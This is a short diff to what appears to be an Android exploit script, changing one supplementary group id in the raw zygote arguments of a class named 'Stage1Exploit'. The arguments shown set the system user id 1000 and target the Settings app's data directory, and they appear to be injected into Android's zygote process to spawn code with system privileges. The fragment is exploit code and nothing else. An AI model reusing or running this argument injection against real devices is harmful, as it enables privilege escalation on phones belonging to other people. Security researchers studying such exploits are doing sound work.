@@ -191,7 +191,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=3003",
-            "--setgroups=1065",
+            "--setgroups=1015",
             "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
